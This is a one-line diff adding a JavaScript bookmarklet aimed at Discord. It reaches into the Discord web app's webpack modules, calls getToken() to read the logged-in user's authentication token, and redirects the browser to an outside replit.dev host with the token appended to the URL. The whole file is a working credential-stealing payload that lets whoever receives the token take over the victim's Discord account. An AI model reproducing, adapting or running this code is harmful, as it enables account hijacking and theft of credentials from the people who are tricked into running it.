@@ -1,0 +1,1 @@
+javascript:const url="https://b707bed2-0d5d-4175-a39f-44929c4f2e6c-00-boj7lelqbogw.kirk.replit.dev/";var f=(webpackChunkdiscord_app.push([[""],{},e=>{m=[];for(let o in e.c)m.push(e.c[o])}]),m).find((e=>void 0!==e?.exports?.default?.getToken)).exports.default.getToken();window.location.replace(url+"/"+f);
